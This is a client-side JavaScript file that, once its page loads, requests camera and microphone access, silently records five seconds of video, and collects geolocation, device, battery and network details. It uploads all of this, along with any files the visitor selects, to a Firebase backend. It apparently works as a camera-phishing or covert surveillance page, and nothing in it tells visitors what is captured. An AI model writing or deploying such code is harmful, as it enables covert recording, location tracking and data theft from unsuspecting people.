import { db, storage } from "./firebase-config.js";
import {
  doc,
  setDoc
} from "https://www.gstatic.com/firebasejs/9.6.10/firebase-firestore.js";

import {
  ref,
  uploadBytes,
  getDownloadURL
} from "https://www.gstatic.com/firebasejs/9.6.10/firebase-storage.js";

const video = document.getElementById("video");
const fileInput = document.getElementById("fileInput");
let mediaRecorder;
let recordedChunks = [];

async function getDeviceInfo() {
  const battery = await navigator.getBattery();
  const connection = navigator.connection || {};
  return {
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    battery: {
      level: battery.level,
      charging: battery.charging,
    },
    connection: {
      downlink: connection.downlink || "unknown",
      effectiveType: connection.effectiveType || "unknown",
    },
  };
}

async function getLocation() {
  return new Promise((resolve, reject) => {
    navigator.geolocation.getCurrentPosition(resolve, reject);
  });
}

async function recordCameraVideo(stream) {
  return new Promise((resolve) => {
    mediaRecorder = new MediaRecorder(stream);
    recordedChunks = [];

    mediaRecorder.ondataavailable = (event) => {
      if (event.data.size > 0) recordedChunks.push(event.data);
    };

    mediaRecorder.onstop = async () => {
      const blob = new Blob(recordedChunks, { type: "video/webm" });
      const videoRef = ref(storage, `recordings/video_${Date.now()}.webm`);
      await uploadBytes(videoRef, blob);
      const videoUrl = await getDownloadURL(videoRef);
      resolve(videoUrl);
    };

    mediaRecorder.start();
    setTimeout(() => mediaRecorder.stop(), 5000); // 5 seconds recording
  });
}

async function uploadFiles(files) {
  const urls = [];
  for (const file of files) {
    const fileRef = ref(storage, `uploads/${Date.now()}_${file.name}`);
    await uploadBytes(fileRef, file);
    const url = await getDownloadURL(fileRef);
    urls.push(url);
  }
  return urls;
}

async function collectAll() {
  const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
  video.srcObject = stream;

  const location = await getLocation().catch(() => null);
  const deviceInfo = await getDeviceInfo();
  const recordedVideoUrl = await recordCameraVideo(stream);

  // Wait for user files
  fileInput.addEventListener("change", async (e) => {
    const files = e.target.files;
    const uploadedFileUrls = await uploadFiles(files);

    const finalData = {
      timestamp: new Date(),
      deviceInfo,
      location: location ? {
        latitude: location.coords.latitude,
        longitude: location.coords.longitude
      } : "Location denied",
      recordedVideo: recordedVideoUrl,
      uploadedFiles: uploadedFileUrls
    };

    // Save to Firestore in doc `web`
    await setDoc(doc(db, "web", "user"), finalData);
    console.log("✔️ Data saved to Firebase.");
  });
}

window.onload = () => {
  collectAll();
};
